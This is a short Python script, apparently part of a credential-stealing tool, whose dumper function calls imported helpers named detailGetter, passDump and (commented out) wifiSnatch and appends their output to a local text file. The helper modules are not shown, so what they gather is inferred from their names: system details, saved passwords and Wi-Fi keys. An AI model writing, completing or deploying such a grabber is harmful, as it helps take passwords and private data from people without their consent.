from details import detailGetter
from wifi import wifiSnatch
from passwords import passDump
import os

def dumper():
    file_path = os.path.join(os.getcwd(), "file269446.txt")

    f = open("file269446.txt", "a")

    f.write(detailGetter())
    f.write("")
    #f.write(wifiSnatch())
    f.write("")
    f.write(passDump())
    f.close()

